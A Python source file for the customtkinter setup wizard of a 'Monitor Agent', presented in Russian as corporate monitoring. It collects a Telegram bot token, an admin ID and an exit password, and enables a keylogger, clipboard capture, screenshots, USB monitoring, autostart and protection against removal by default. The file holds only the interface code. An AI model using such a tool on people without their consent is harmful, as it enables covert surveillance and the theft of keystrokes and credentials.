"""Beautiful first-launch setup wizard using customtkinter.

Pages:
  1. Welcome + language/info
  2. Telegram bot token
  3. Admin Telegram ID
  4. Exit password
  5. Feature toggles
  6. Done — animated checkmark
"""
from __future__ import annotations

import hashlib
import logging
import re
import threading
import time
from typing import Optional

import customtkinter as ctk

log = logging.getLogger("monitor.agent.setup")

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

ACCENT = "#238636"
ACCENT_HOVER = "#2ea043"
BG_DARK = "#0d1117"
BG_CARD = "#161b22"
FG = "#e6e8eb"
FG_MUTED = "#8b949e"

WINDOW_W = 620
WINDOW_H = 520


class SetupResult:
    def __init__(self):
        self.bot_token: str = ""
        self.admin_id: int = 0
        self.exit_password: str = ""
        self.features: dict[str, bool] = {
            "tracking": True,
            "screenshots": True,
            "blocker": True,
            "usb": True,
            "clipboard": True,
            "keylogger": True,
            "software": True,
            "autostart": True,
        }
        self.completed: bool = False


def run_setup() -> Optional[SetupResult]:
    """Show setup wizard. Returns SetupResult if user completed, None if cancelled."""
    result = SetupResult()
    app = _SetupApp(result)
    app.mainloop()
    return result if result.completed else None


class _SetupApp(ctk.CTk):
    def __init__(self, result: SetupResult):
        super().__init__()
        self.result = result
        self.title("Monitor Agent — Setup")
        self.geometry(f"{WINDOW_W}x{WINDOW_H}")
        self.resizable(False, False)
        self.configure(fg_color=BG_DARK)
        try:
            self.attributes("-topmost", True)
        except Exception:
            pass

        self._page = 0
        self._pages: list[ctk.CTkFrame] = []
        self._build_pages()
        self._show_page(0)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _on_close(self):
        self.result.completed = False
        self.destroy()

    def _build_pages(self):
        self._pages = [
            self._page_welcome(),
            self._page_bot_token(),
            self._page_admin_id(),
            self._page_password(),
            self._page_features(),
            self._page_done(),
        ]

    def _show_page(self, idx: int):
        for p in self._pages:
            p.pack_forget()
        self._page = idx
        self._pages[idx].pack(fill="both", expand=True, padx=30, pady=20)

    def _next(self):
        if self._page < len(self._pages) - 1:
            self._show_page(self._page + 1)

    def _prev(self):
        if self._page > 0:
            self._show_page(self._page - 1)

    # ----- Page builders -----

    def _page_welcome(self) -> ctk.CTkFrame:
        f = ctk.CTkFrame(self, fg_color=BG_DARK)
        ctk.CTkLabel(f, text="🛡", font=("Segoe UI Emoji", 56)).pack(pady=(20, 5))
        ctk.CTkLabel(
            f, text="Monitor Agent",
            font=("Segoe UI", 28, "bold"), text_color=FG,
        ).pack()
        ctk.CTkLabel(
            f, text="Корпоративный мониторинг и защита данных",
            font=("Segoe UI", 13), text_color=FG_MUTED,
        ).pack(pady=(4, 20))
        ctk.CTkLabel(
            f,
            text=(
                "Этот мастер настроит агент мониторинга:\n\n"
                "• Управление через Telegram-бот (только ваш ID)\n"
                "• Отслеживание активности приложений\n"
                "• Скриншоты по таймеру\n"
                "• Контроль USB, буфера обмена, ПО\n"
                "• Блокировка процессов и экрана\n"
                "• Шифрование всех данных на диске\n"
                "• Автозапуск и защита от удаления"
            ),
            font=("Segoe UI", 11), text_color=FG_MUTED,
            justify="left", anchor="w", wraplength=500,
        ).pack(fill="x", padx=10)
        self._nav_buttons(f, back=False)
        return f

    def _page_bot_token(self) -> ctk.CTkFrame:
        f = ctk.CTkFrame(self, fg_color=BG_DARK)
        ctk.CTkLabel(f, text="🤖 Telegram Bot Token", font=("Segoe UI", 20, "bold"), text_color=FG).pack(pady=(30, 5))
        ctk.CTkLabel(
            f,
            text="Создайте бота через @BotFather в Telegram и вставьте токен сюда.",
            font=("Segoe UI", 11), text_color=FG_MUTED, wraplength=500,
        ).pack(pady=(0, 20))

        self._token_var = ctk.StringVar()
        entry = ctk.CTkEntry(
            f, textvariable=self._token_var,
            width=460, height=42, font=("Consolas", 13),
            placeholder_text="123456789:ABCdef...",
        )
        entry.pack()

        self._token_err = ctk.CTkLabel(f, text="", font=("Segoe UI", 10), text_color="#f85149")
        self._token_err.pack(pady=5)

        self._nav_buttons(f, next_validate=self._validate_token)
        return f

    def _validate_token(self) -> bool:
        token = self._token_var.get().strip()
        if not re.match(r"^\d+:[A-Za-z0-9_-]{30,}$", token):
            self._token_err.configure(text="Неверный формат токена (пример: 123456:ABC...)")
            return False
        self.result.bot_token = token
        self._token_err.configure(text="")
        return True

    def _page_admin_id(self) -> ctk.CTkFrame:
        f = ctk.CTkFrame(self, fg_color=BG_DARK)
        ctk.CTkLabel(f, text="👤 Admin Telegram ID", font=("Segoe UI", 20, "bold"), text_color=FG).pack(pady=(30, 5))
        ctk.CTkLabel(
            f,
            text=(
                "Введите ваш Telegram ID. Узнать можно через @userinfobot.\n"
                "Только этот ID сможет управлять агентом."
            ),
            font=("Segoe UI", 11), text_color=FG_MUTED, wraplength=500,
        ).pack(pady=(0, 20))

        self._id_var = ctk.StringVar()
        ctk.CTkEntry(
            f, textvariable=self._id_var,
            width=300, height=42, font=("Consolas", 14),
            placeholder_text="123456789",
        ).pack()

        self._id_err = ctk.CTkLabel(f, text="", font=("Segoe UI", 10), text_color="#f85149")
        self._id_err.pack(pady=5)

        self._nav_buttons(f, next_validate=self._validate_id)
        return f

    def _validate_id(self) -> bool:
        raw = self._id_var.get().strip()
        if not raw.isdigit() or int(raw) < 1:
            self._id_err.configure(text="ID должен быть положительным числом")
            return False
        self.result.admin_id = int(raw)
        self._id_err.configure(text="")
        return True

    def _page_password(self) -> ctk.CTkFrame:
        f = ctk.CTkFrame(self, fg_color=BG_DARK)
        ctk.CTkLabel(f, text="🔑 Пароль на выход", font=("Segoe UI", 20, "bold"), text_color=FG).pack(pady=(30, 5))
        ctk.CTkLabel(
            f,
            text=(
                "Этот пароль потребуется, чтобы закрыть или удалить агент.\n"
                "Оставьте пустым, если пароль не нужен."
            ),
            font=("Segoe UI", 11), text_color=FG_MUTED, wraplength=500,
        ).pack(pady=(0, 20))

        self._pw_var = ctk.StringVar()
        ctk.CTkEntry(
            f, textvariable=self._pw_var,
            width=360, height=42, font=("Consolas", 14),
            show="●", placeholder_text="пароль (необязательно)",
        ).pack()

        self._pw2_var = ctk.StringVar()
        ctk.CTkEntry(
            f, textvariable=self._pw2_var,
            width=360, height=42, font=("Consolas", 14),
            show="●", placeholder_text="повторите пароль",
        ).pack(pady=(10, 0))

        self._pw_err = ctk.CTkLabel(f, text="", font=("Segoe UI", 10), text_color="#f85149")
        self._pw_err.pack(pady=5)

        self._nav_buttons(f, next_validate=self._validate_pw)
        return f

    def _validate_pw(self) -> bool:
        p1 = self._pw_var.get()
        p2 = self._pw2_var.get()
        if p1 and p1 != p2:
            self._pw_err.configure(text="Пароли не совпадают")
            return False
        self.result.exit_password = p1
        self._pw_err.configure(text="")
        return True

    def _page_features(self) -> ctk.CTkFrame:
        f = ctk.CTkFrame(self, fg_color=BG_DARK)
        ctk.CTkLabel(f, text="⚙️ Функции", font=("Segoe UI", 20, "bold"), text_color=FG).pack(pady=(20, 10))

        self._feat_vars: dict[str, ctk.BooleanVar] = {}
        items = [
            ("tracking", "📊 Отслеживание активных окон"),
            ("screenshots", "📸 Скриншоты по таймеру"),
            ("blocker", "🚫 Блокировка процессов"),
            ("usb", "🔌 Мониторинг USB-устройств"),
            ("clipboard", "📋 Мониторинг буфера обмена"),
            ("keylogger", "⌨️ Лог клавиш"),
            ("software", "📦 Мониторинг нового ПО"),
            ("autostart", "🔄 Автозапуск с Windows"),
        ]
        for key, label in items:
            var = ctk.BooleanVar(value=True)
            self._feat_vars[key] = var
            ctk.CTkCheckBox(
                f, text=label, variable=var,
                font=("Segoe UI", 12), text_color=FG,
                fg_color=ACCENT, hover_color=ACCENT_HOVER,
            ).pack(anchor="w", padx=40, pady=4)

        self._nav_buttons(f, next_label="Готово ✓", next_validate=self._finalize)
        return f

    def _finalize(self) -> bool:
        for k, v in self._feat_vars.items():
            self.result.features[k] = v.get()
        self.result.completed = True
        return True

    def _page_done(self) -> ctk.CTkFrame:
        f = ctk.CTkFrame(self, fg_color=BG_DARK)
        ctk.CTkLabel(f, text="✅", font=("Segoe UI Emoji", 64)).pack(pady=(50, 10))
        ctk.CTkLabel(
            f, text="Настройка завершена!",
            font=("Segoe UI", 22, "bold"), text_color=FG,
        ).pack()
        ctk.CTkLabel(
            f,
            text="Агент запускается. Управляйте через Telegram-бот.",
            font=("Segoe UI", 12), text_color=FG_MUTED,
        ).pack(pady=10)

        btn = ctk.CTkButton(
            f, text="Запустить агент", font=("Segoe UI", 14, "bold"),
            fg_color=ACCENT, hover_color=ACCENT_HOVER,
            height=44, width=220,
            command=self.destroy,
        )
        btn.pack(pady=20)

        # No auto-close - wait for user to complete setup
        # def _auto():
        #     time.sleep(30)
        #     try:
        #         self.destroy()
        #     except Exception:
        #         pass
        # threading.Thread(target=_auto, daemon=True).start()

        return f

    # ----- nav -----

    def _nav_buttons(self, parent: ctk.CTkFrame, *, back: bool = True, next_label: str = "Далее →", next_validate=None):
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(side="bottom", fill="x", pady=16, padx=10)

        if back:
            ctk.CTkButton(
                row, text="← Назад", width=100,
                fg_color="transparent", border_width=1, border_color="#30363d",
                text_color=FG_MUTED, hover_color="#21262d",
                command=self._prev,
            ).pack(side="left")

        def _on_next():
            if next_validate:
                if not next_validate():
                    return
            self._next()

        ctk.CTkButton(
            row, text=next_label, width=140,
            fg_color=ACCENT, hover_color=ACCENT_HOVER,
            font=("Segoe UI", 13, "bold"),
            command=_on_next,
        ).pack(side="right")
